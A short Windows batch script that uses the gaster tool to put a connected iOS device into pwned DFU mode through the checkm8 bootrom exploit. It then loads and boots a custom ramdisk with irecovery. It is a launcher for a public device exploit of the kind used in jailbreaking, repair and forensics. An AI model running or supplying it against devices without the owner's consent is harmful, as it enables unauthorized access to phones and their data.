@echo off
REM Ramdisk exploit using checkm8 - First put device in pwned DFU mode, then load ramdisk
echo [*] Starting ramdisk exploit using checkm8...
echo [*] Step 1: Putting device in pwned DFU mode...
gaster\gaster.exe pwn
if errorlevel 1 (
    echo [!] Failed to put device in pwned DFU mode
    exit /b 1
)
echo [*] Device is now in pwned DFU mode
echo [*] Step 2: Loading ramdisk...
libimobiledevice\irecovery.exe -f "%~1"
if errorlevel 1 (
    echo [!] Failed to send ramdisk file
    exit /b 1
)
echo [*] Step 3: Executing ramdisk command...
libimobiledevice\irecovery.exe -c ramdisk
if errorlevel 1 (
    echo [!] Failed to execute ramdisk command
    exit /b 1
)
echo [*] Ramdisk loaded successfully!
